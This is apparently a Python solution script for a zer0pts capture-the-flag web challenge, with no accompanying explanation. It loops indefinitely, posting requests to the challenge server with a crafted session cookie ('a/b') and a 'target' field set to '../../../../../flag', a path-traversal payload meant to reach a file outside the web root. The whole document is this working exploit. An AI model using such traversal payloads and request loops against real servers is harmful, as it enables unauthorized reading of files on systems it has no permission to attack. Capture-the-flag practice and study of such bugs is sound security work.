import requests

URL = "http://web.ctf.zer0pts.com:8001/"
# URL = "http://localhost:8080/"

cookies = {
    "PHPSESSID": "a/b"
}

cnt = 0

sess = requests.Session()

while True:
    r = sess.post(
        URL,
        cookies=cookies,
        data={
            "mode": "create",
            "name": "qwaz",
            "type": "1",
            "target": "../../../../../flag",
        }
    )

    print(f"Try {cnt} - {r.status_code}")
    cnt += 1